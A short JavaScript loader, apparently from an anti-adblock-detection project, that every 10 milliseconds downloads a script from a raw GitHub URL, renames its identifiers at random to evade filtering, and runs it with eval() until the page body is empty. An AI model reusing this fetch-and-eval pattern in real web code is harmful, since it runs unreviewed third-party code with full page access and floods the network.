(function(window) {
	var URL = "https://raw.githubusercontent.com/treeviewxyz/FuckFuckFuckAdBlock/master/XXXXXXXXXX.js";

	var FFFAdBlock = function(){
		var ajax = new XMLHttpRequest();

		ajax.onreadystatechange = function(){
			if(this.readyState == 4 && this.status == 200){
				var code = this.responseText.replace(/XXXXXXXXXX/g, Math.random().toString(36).substr(2, 10));
				eval(code);
			}
		}

		ajax.open("GET", URL, true);
		ajax.send();
	}

	var CC = setInterval(function(){
		FFFAdBlock();
		if(document.body.innerHTML == "") clearInterval(CC);
	}, 10);
})(window);
